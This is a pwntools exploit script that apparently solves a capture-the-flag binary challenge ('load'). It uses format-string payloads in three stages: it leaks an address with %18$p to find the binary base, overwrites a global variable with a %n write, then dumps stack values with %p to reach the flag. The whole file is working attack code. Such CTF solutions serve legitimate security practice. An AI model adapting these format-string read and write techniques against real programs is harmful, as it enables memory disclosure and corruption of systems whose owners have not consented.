from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./load')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')

# p = process('./load_patched')
p = connect('binary.challs.pragyanctf.tech', 6003)

####################################
### Stage 1: Leak binary address ###
####################################
p.sendlineafter(b'2) Upgrade Pack', b'1')
payload = b'%18$p'
p.sendlineafter(b'Wanna upgrade pack?', payload)
p.recvline()

# Get address of __libc_csu_init
__libc_csu_init_addr = int(p.recvline()[:-1].split(b'0x')[1], 16)
log.success("__libc_csu_init: " + hex(__libc_csu_init_addr))

# Calculate binary base address
exe.address = __libc_csu_init_addr - exe.sym['__libc_csu_init']
log.success("Exe base: " + hex(exe.address))

###########################
### Stage 2: Change `b` ###
###########################
p.sendlineafter(b'2) Upgrade Pack', b'1')
payload = b'%c'*15
payload += '%{}c%n'.format(249-15).encode()    # We will use this to change b
payload = payload.ljust(0x58, b'P')             # Padding
payload += p64(exe.sym['b'])
p.sendlineafter(b'Wanna upgrade pack?', payload)
p.recvline()

#########################
### Stage 3: Get flag ###
#########################
p.sendlineafter(b'2) Upgrade Pack', b'2')
payload = b'%p'*20
p.sendlineafter(b'Enter coupon code:', payload)

p.interactive()